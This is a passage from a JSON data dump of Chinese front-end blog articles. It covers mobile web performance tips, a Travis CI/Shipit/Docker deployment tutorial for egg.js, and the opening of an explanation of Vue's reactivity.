体积较小，而且是矢量图，因此缩放时不会失真；\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e可以方便地修改图片大小尺寸和呈现颜色。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e但是需要注意的是，\u003cstrong\u003eiconfont\u003c/strong\u003e 引用不同 \u003cstrong\u003ewebfont\u003c/strong\u003e 格式时的兼容性写法，根据经验推荐尽量按照以下顺序书写，否则不容易兼容到所有的浏览器上。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e@font-face{\n   font-family:iconfont;\n   src:url(\u003cspan class=\"hljs-string\"\u003e\"./iconfont.eot\"\u003c/span\u003e);\n   src:url(\u003cspan class=\"hljs-string\"\u003e\"./iconfont.eot?#iefix\"\u003c/span\u003e)  format(\u003cspan class=\"hljs-string\"\u003e\"eot\"\u003c/span\u003e),\n       url(\u003cspan class=\"hljs-string\"\u003e\"./iconfont.woff\"\u003c/span\u003e)  format(\u003cspan class=\"hljs-string\"\u003e\"woff\"\u003c/span\u003e),\n       url(\u003cspan class=\"hljs-string\"\u003e\"./iconfont.ttf\"\u003c/span\u003e)  format(\u003cspan class=\"hljs-string\"\u003e\"truetype\"\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e7．定义图片大小限制\u003c/h4\u003e\n\u003cp\u003e加载的单张图片一般建议不超过 \u003cstrong\u003e30KB\u003c/strong\u003e，避免大图片加载时间长而阻塞页面其他资源的下载，因此推荐在 \u003cstrong\u003e10KB\u003c/strong\u003e 以内。如果用户上传的图片过大，建议设置告警系统，帮助我们观察了解整个网站的图片流量情况，做出进一步的改善。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e8．强缓存策略\u003c/h4\u003e\n\u003cp\u003e对于一些 \u003cstrong\u003e永远不会变\u003c/strong\u003e 的图片可以使用强缓存的方式缓存在用户的浏览器上。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eJavaScript 脚本类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1．尽量使用 id 选择器\u003c/h4\u003e\n\u003cp\u003e选择器选择页面 \u003cstrong\u003eDOM\u003c/strong\u003e 元素时尽量使用 \u003cstrong\u003eid\u003c/strong\u003e 选择器，因为 \u003cstrong\u003eid\u003c/strong\u003e 选择器速度最快。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2．合理缓存 DOM 对象\u003c/h4\u003e\n\u003cp\u003e对于需要重复使用的 \u003cstrong\u003eDOM\u003c/strong\u003e 对象，要优先设置缓存变量，避免每次使用时都要从整个 \u003cstrong\u003eDOM\u003c/strong\u003e 树中重新查找。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//不推荐\n$(\u003cspan class=\"hljs-string\"\u003e'#mod.active'\u003c/span\u003e).remove(\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e);\n$(\u003cspan class=\"hljs-string\"\u003e'#mod.not-active'\u003c/span\u003e).addClass(\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e);\n\n//推荐\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$mod\u003c/span\u003e=$(\u003cspan class=\"hljs-string\"\u003e'#mod'\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$mod\u003c/span\u003e.find(\u003cspan class=\"hljs-string\"\u003e'.active'\u003c/span\u003e).remove(\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$mod\u003c/span\u003e.find(\u003cspan class=\"hljs-string\"\u003e'.not-active'\u003c/span\u003e).addClass(\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e3．页面元素尽量使用事件代理，避免直接事件绑定\u003c/h4\u003e\n\u003cp\u003e使用事件代理可以避免对每个元素都进行绑定，并且可以避免出现内存泄露及需要动态添加元素的事件绑定问题，所以尽量不要直接使用事件绑定。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//不推荐\n$(\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   console.log(this);\n\n});\n\n//推荐\n$(\u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   console.log(this);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e4．使用 touchstart 代替 click\u003c/h4\u003e\n\u003cp\u003e由于移动端屏幕的设计， \u003ccode\u003etouchstart\u003c/code\u003e 事件和 \u003ccode\u003eclick\u003c/code\u003e 事件触发时间之间存在 \u003cstrong\u003e300\u003c/strong\u003e 毫秒的延时，所以在页面中没有实现 touchmove 滚动处理的情况下，可以使用 touchstart 事件来代替元素的 click 事件，加快页面点击的响应速度，提高用户体验。但同时我们也要注意页面重叠元素 \u003cstrong\u003etouch\u003c/strong\u003e 动作的点击穿透问题。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//不推荐\n$(\u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   console.log(this);\n});\n\n//推荐\n$(\u003cspan class=\"hljs-string\"\u003e'body'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'touchstart'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   console.log(this);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e5．避免 touchmove、scroll 连续事件处理\u003c/h4\u003e\n\u003cp\u003e需要对 \u003ccode\u003etouchmove\u003c/code\u003e、\u003ccode\u003escroll\u003c/code\u003e 这类可能连续触发回调的事件设置事件节流，例如设置每隔 \u003cstrong\u003e16ms\u003c/strong\u003e（\u003cstrong\u003e60\u003c/strong\u003e 帧的帧间隔为 \u003cstrong\u003e16.7ms\u003c/strong\u003e，因此可以合理地设置为 \u003cstrong\u003e16ms\u003c/strong\u003e ）才进行一次事件处理，避免频繁的事件调用导致移动端页面卡顿。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//不推荐\n$(\u003cspan class=\"hljs-string\"\u003e'.scroller'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'touchmove'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   console.log(this);\n});\n\n//推荐\n$(\u003cspan class=\"hljs-string\"\u003e'.scroller'\u003c/span\u003e).on(\u003cspan class=\"hljs-string\"\u003e'touchmove'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'.btn'\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e){\n   \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e self=this;\n   \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n       console.log(self);\n   },16);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e6．避免使用 eval、with，使用 join 代替连接符＋，推荐使用 ECMAScript6 的字符串模板\u003c/h4\u003e\n\u003cp\u003e这些都是一些基础的安全脚本编写问题，尽可能使用较高效率的特性来完成这些操作，避免不规范或不安全的写法。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e7．尽量使用 ECMAScript6＋的特性来编程\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eECMAScript6＋\u003c/strong\u003e 一定程度上更加安全高效，而且部分特性执行速度更快，也是未来规范的需要，所以推荐使用 \u003cstrong\u003eECMAScript6＋\u003c/strong\u003e 的新特性来完成后面的开发。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e渲染类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1．使用 Viewport 固定屏幕渲染，可以加速页面渲染内容\u003c/h4\u003e\n\u003cp\u003e一般认为，在移动端设置 \u003cstrong\u003eViewport\u003c/strong\u003e 可以加速页面的渲染，同时可以避免缩放导致页面重排重绘。在移动端固定 \u003cstrong\u003eViewport\u003c/strong\u003e 设置的方法如下。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--设置viewport不缩放--\u0026gt;\n\u0026lt;meta  name=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no\"\u003c/span\u003e\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e2．避免各种形式重排重绘\u003c/h4\u003e\n\u003cp\u003e页面的重排重绘很耗性能，所以一定要尽可能减少页面的重排重绘，例如页面图片大小变化、元素位置变化等这些情况都会导致重排重绘。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3．使用 CSS3 动画，开启 GPU 加速\u003c/h4\u003e\n\u003cp\u003e使用 CSS3 动画时可以设置 \u003ccode\u003etransform:translateZ(0)\u003c/code\u003e 来开启移动设备浏览器的 \u003cstrong\u003eGPU\u003c/strong\u003e 图形处理加速，让动画过程更加流畅，但需要注意的是，在 \u003cstrong\u003eNative WebView\u003c/strong\u003e 下 \u003cstrong\u003eGPU\u003c/strong\u003e 加速有几率产生 \u003cstrong\u003eApp Crash\u003c/strong\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e-webkit-transform:translateZ(0);\n   -ms-transform:translateZ(0);\n    -o-transform:translateZ(0);\n       transform:translateZ(0);\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e4．合理使用 Canvas 和 requestAnimationFrame\u003c/h4\u003e\n\u003cp\u003e选择 \u003cstrong\u003eCanvas\u003c/strong\u003e 或 \u003cstrong\u003erequestAnimationFrame\u003c/strong\u003e 等更高效的动画实现方式，尽量避免使用 \u003cstrong\u003esetTimeout\u003c/strong\u003e、\u003cstrong\u003esetInterval\u003c/strong\u003e 等方式来直接处理连续动画。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e5．SVG 代替图片\u003c/h4\u003e\n\u003cp\u003e部分情况下可以考虑使用 \u003cstrong\u003eSVG\u003c/strong\u003e 代替图片实现动画，因为使用 \u003cstrong\u003eSVG\u003c/strong\u003e 格式内容更小，而且 \u003cstrong\u003eSVG DOM\u003c/strong\u003e 结构方便调整。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e6．不滥用 float\u003c/h4\u003e\n\u003cp\u003e在 \u003cstrong\u003eDOM\u003c/strong\u003e 渲染树生成后的布局渲染阶段，使用 \u003cstrong\u003efloat\u003c/strong\u003e 的元素布局计算比较耗性能，所以尽量减少 \u003cstrong\u003efloat\u003c/strong\u003e 的使用，推荐使用固定布局或 \u003cstrong\u003eflex-box\u003c/strong\u003e 弹性布局的方式来实现页面元素布局。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e7．不滥用 web 字体或过多 font-size 声明\u003c/h4\u003e\n\u003cp\u003e过多的 \u003cstrong\u003efont-size\u003c/strong\u003e 声明会增加字体的大小计算，而且也没有必要的。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e8．做好脚本容错\u003c/h4\u003e\n\u003cp\u003e脚本容错可以避免\u003cstrong\u003e非正常环境\u003c/strong\u003e的执行错误影响页面的加载和不相关功能的使用\u003c/p\u003e\n\u003cp\u003e##架构协议类\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e1．尝试使用 SPDY 和 HTTP2\u003c/h4\u003e\n\u003cp\u003e在条件允许的情况下可以考虑使用 \u003cstrong\u003eSPDY\u003c/strong\u003e 协议来进行文件资源传输，利用连接复用加快传输过程，缩短资源加载时间。\u003cstrong\u003eHTTP2\u003c/strong\u003e 在未来也是可以考虑尝试的。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2．使用后端数据渲染\u003c/h4\u003e\n\u003cp\u003e使用后端数据渲染的方式可以加快页面内容的渲染展示，避免空白页面的出现，同时可以解决移动端页面 \u003cstrong\u003eSEO\u003c/strong\u003e 的问题。如果条件允许，后端数据渲染是一个很不错的实践思路。后面的章节会详细介绍后端数据渲染的相关内容。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3．使用 NativeView 代替 DOM 的性能劣势\u003c/h4\u003e\n\u003cp\u003e可以尝试使用 \u003cstrong\u003eNativeView\u003c/strong\u003e 的 \u003cstrong\u003eMNV*\u003c/strong\u003e 开发模式来避免 \u003cstrong\u003eHTML DOM\u003c/strong\u003e 性能慢的问题，目前使用 \u003cstrong\u003eMNV*\u003c/strong\u003e 的开发模式已经可以将页面内容渲染体验做到接近客户端 \u003cstrong\u003eNative\u003c/strong\u003e 应用的体验了。但需要避免 \u003cstrong\u003ejs Framework\u003c/strong\u003e 和 \u003cstrong\u003enative Framework\u003c/strong\u003e 的频繁交互。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e世界上没有十全十美的事情，在我们做到了极致优化的同时也付出了很大的代价，这也是前端优化的一个问题。理论上这些优化都是可以实现的，但是作为工程师我们也要明白懂得权衡。优化提升了用户体验，是数据加载更快，但是项目代码却被打乱，异步内容要拆分出来，首屏的一个雪碧图可能要分成两个，页面项目代码维护成本成倍增加，项目结构也可能变得混乱。所以前期在设计构建、组件的解决方案时要解决好异步的自动处理问题。任何一部分优化都可以做得很深入，但不一定都值得，在优化的同时也要尽量考虑性价比，这才是我们作为一名前端工程师处理前端优化时应该具有的正确思维。欢迎大家加入\u003cstrong\u003eQQ\u003c/strong\u003e 前端技术交流群 \u003ccode\u003e544587175\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514890157.9934","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0706"},"id":"5a3508d66fb9a045167d4394","author":{"$oid":"5a4b770f19da8721f49c06f3"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"以 egg.js 为例的持续集成（CI）、持续部署（CD）","meta":{"likeCount":0},"tag":["Docker","Travis CI","Egg.js"],"comment":[],"shortContent":"其实写 Shell 脚本也用不了几行，反而更简单些，只是需要一定的 linux 技能。 Dockerfile 容器化你的应用。 就这 3 个核心文件，不花一分钱就可以实现基于 Docker 的 CI/CD, 当然普通的。 当然假如没有使用 Docker 的能力，回退到 PR 的…","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"poster\" src=\"https://user-gold-cdn.xitu.io/2017/12/16/1605f30294e91400?w=1920\u0026amp;h=1080\u0026amp;f=png\u0026amp;s=305243\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e看这里\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如何操作请看这里 \u003ca target=\"_blank\" href=\"https://nodelover.me/status/video/12\"\u003e视频分享链接地址\u003c/a\u003e\u003cbr\u003e\n所有代码在这个地方 \u003ca target=\"_blank\" href=\"https://github.com/MiYogurt/deploy-egg-sample\"\u003e代码仓库\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e使用 TravisCI 配合 Shipit.js 进行自动化部署\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eTravisCI: 进行测试，代码覆盖率\u003c/li\u003e\n\u003cli\u003eShipit：基于 JS 的部署引擎\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这里贴出来一些关键性代码\u003c/p\u003e\n\u003cp\u003e创建 \u003ccode\u003eshipitfile.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-string\"\u003e'use strict'\u003c/span\u003e;\n\nmodule.exports = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(shipit) {\n  require(\u003cspan class=\"hljs-string\"\u003e'shipit-deploy'\u003c/span\u003e)(shipit);\n\n  shipit.initConfig({\n    default: {\n      workspace: \u003cspan class=\"hljs-string\"\u003e'/tmp/github-monitor'\u003c/span\u003e,\n      deployTo: \u003cspan class=\"hljs-string\"\u003e'/home/nono/app'\u003c/span\u003e,\n      repositoryUrl: \u003cspan class=\"hljs-string\"\u003e'https://github.com/MiYogurt/deploy-egg-sample.git'\u003c/span\u003e,\n      ignores: [ \u003cspan class=\"hljs-string\"\u003e'.git'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'node_modules'\u003c/span\u003e ],\n      rsync: [ \u003cspan class=\"hljs-string\"\u003e'--del'\u003c/span\u003e ],\n      keepReleases: 2,\n      key: \u003cspan class=\"hljs-string\"\u003e'./scripts/source.key'\u003c/span\u003e,\n      shallowClone: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    },\n    staging: {\n      servers: \u003cspan class=\"hljs-string\"\u003e'root@139.199.227.41'\u003c/span\u003e,\n    },\n  });\n\n  shipit.task(\u003cspan class=\"hljs-string\"\u003e'docker'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e shipit.start([ \u003cspan class=\"hljs-string\"\u003e'build'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'remove'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'create'\u003c/span\u003e ]);\n  });\n\n  shipit.blTask(\u003cspan class=\"hljs-string\"\u003e'build'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e shipit.remote(\u003cspan class=\"hljs-string\"\u003e'docker build -t nodelover:v1 .'\u003c/span\u003e, {\n      cwd: \u003cspan class=\"hljs-string\"\u003e'/home/nono/app/current'\u003c/span\u003e,\n    });\n  });\n\n  shipit.blTask(\u003cspan class=\"hljs-string\"\u003e'create'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e shipit.remote(\u003cspan class=\"hljs-string\"\u003e'docker run -d --name app -p 8080:7001 nodelover:v1'\u003c/span\u003e, {\n      cwd: \u003cspan class=\"hljs-string\"\u003e'/home/nono/app/current'\u003c/span\u003e,\n    });\n  });\n\n  shipit.blTask(\u003cspan class=\"hljs-string\"\u003e'remove'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e shipit.remote(\u003cspan class=\"hljs-string\"\u003e'docker stop app'\u003c/span\u003e, {\n          cwd: \u003cspan class=\"hljs-string\"\u003e'/home/nono/app/current'\u003c/span\u003e,\n        }).then(o =\u0026gt; shipit.remote(\u003cspan class=\"hljs-string\"\u003e'docker rm app'\u003c/span\u003e, {\n          cwd: \u003cspan class=\"hljs-string\"\u003e'/home/nono/app/current'\u003c/span\u003e,\n        })).catch(err =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e\"no need stop\"\u003c/span\u003e))\n    });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其实写 Shell 脚本也用不了几行，反而更简单些，只是需要一定的 linux 技能。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDockerfile\u003c/code\u003e 容器化你的应用。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003efrom node:9.2.0\n\nadd . /app\n\nexpose 7001\n\nworkdir /app\n\nrun npm i\n\ncmd npm run start\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003e.travis.yml\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs yaml\" lang=\"yaml\"\u003e\u003cspan class=\"hljs-attr\"\u003esudo:\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003elanguage:\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003enode_js\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003eaddons:\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003e  ssh_known_hosts:\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003exxx.xxx.xxx.xx\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003enode_js:\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'9'\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003ebefore_install:\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003eopenssl\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003eaes-256-cbc\u003c/span\u003e \u003cspan class=\"hljs-bullet\"\u003e-K\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e$encrypted_b8bda4515144_key\u003c/span\u003e \u003cspan class=\"hljs-bullet\"\u003e-iv\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e$encrypted_b8bda4515144_iv\u003c/span\u003e \u003cspan class=\"hljs-bullet\"\u003e-in\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003escripts/source.key.enc\u003c/span\u003e \u003cspan class=\"hljs-bullet\"\u003e-out\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003escripts/source.key\u003c/span\u003e \u003cspan class=\"hljs-bullet\"\u003e-d\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003einstall:\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003enpm\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003ei\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003enpminstall\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003enpminstall\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# script:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#   - npm run ci\u003c/span\u003e\n\u003cspan class=\"hljs-attr\"\u003eafter_script:\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e# - npminstall codecov \u0026amp;\u0026amp; codecov\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003echmod\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e600\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003escripts/source.key\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003eshipit\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003estaging\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003edeploy\u003c/span\u003e\n\u003cspan class=\"hljs-bullet\"\u003e  -\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003eshipit\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003estaging\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003edocker\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e就这 3 个核心文件，不花一分钱就可以实现基于 Docker 的 CI/CD, 当然普通的。\u003c/p\u003e\n\u003cp\u003e当然假如没有使用 Docker 的能力，回退到 PR 的那一个版本就可以了。\u003c/p\u003e\n","buildTime":"1514888593.6443","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0702"},"id":"5a0e53965188254dd935f850","author":{"$oid":"5a4b770f19da8721f49c06f6"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Vue响应式----数据响应式原理","meta":{"likeCount":0},"tag":["Vue.js","JavaScript","前端"],"comment":[],"shortContent":"Vue的数据响应主要是依赖了Object.defineProperty()，那么整个过程是怎么样的呢？以我们自己的想法来走Vue的道路，其实也就是以Vue的原理为终点，我们来逆推一下实现过程。 例如const obj = {},然后再调用defineReactive(obj,'…","content":"\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\u003cp\u003eVue的数据响应主要是依赖了\u003ccode\u003eObject.defineProperty()\u003c/code\u003e，那么整个过程是怎么样的呢？以我们自己的想法来走Vue的道路，其实也就是以Vue的原理为终点，我们来逆推一下实现过程。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文代码皆为低配版本，很多地方都不严谨，比如 \u003ccode\u003eif(typeof obj === 'object')\u003c/code\u003e这是在判断\u003ccode\u003eobj\u003c/code\u003e是否为为一个对象，虽然\u003ccode\u003eobj\u003c/code\u003e也有可能是数组等其他类型的数据，但是本文为了简便，就直接这样写来表示判断对象，对于数组使用\u003ccode\u003eArray.isArray()\u003c/code\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e改造数据\u003c/h3\u003e\u003cp\u003e我们先来尝试写一个函数，用于改造对象：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e为什么要先写这个函数呢？ 因为改造数据是一个最基础也是最重要的步骤,之后所有的步骤都会依赖这一步。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 代码 1.1\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edefineReactive\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eobj,key,val\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.defineProperty(obj,key,{\n        \u003cspan class=\"hljs-attr\"\u003eenumerable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003econfigurable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eget\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e val;\n        },\n        \u003cspan class=\"hljs-attr\"\u003eset\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003enewVal\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-comment\"\u003e//判断新值与旧值是否相等\u003c/span\u003e\n            \u003cspan class=\"hljs-comment\"\u003e//判断的后半段是为了验证新值与旧值都为NaN的情况  NaN不等于自身\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(newVal === val || (newVal !== newVal \u0026amp;\u0026amp; value !== value)){\n                \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ;\n            }\n            val = newVal;\n        }\n    });\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e例如\u003ccode\u003econst obj = {}\u003c/code\u003e,然后再调用\u003ccode\u003edefineReactive(obj,'a',2)\u003c/code\u003e方法，此时在函数内，\u003ccode\u003eval=2\u003c/code\u003e，然后每次获取\u003ccode\u003eobj.a\u003c/code\u003e的值的时候都是获取\u003ccode\u003eval\u003c/code\u003e的值，设置\u003ccode\u003eobj.a\u003c/code\u003e的时候也是设置\u003ccode\u003eval\u003c/code\u003e的值。（每次调用\u003ccode\u003edefineReactive\u003c/code\u003e都会产生一个闭包保存了\u003ccode\u003eval\u003c/code\u003e的值）;\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e流程讨论\u003c/h3\u003e\u003cp\u003e经过验证之后，发现这个函数确实可以使用的。然后我们来讨论一下响应的流程：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" 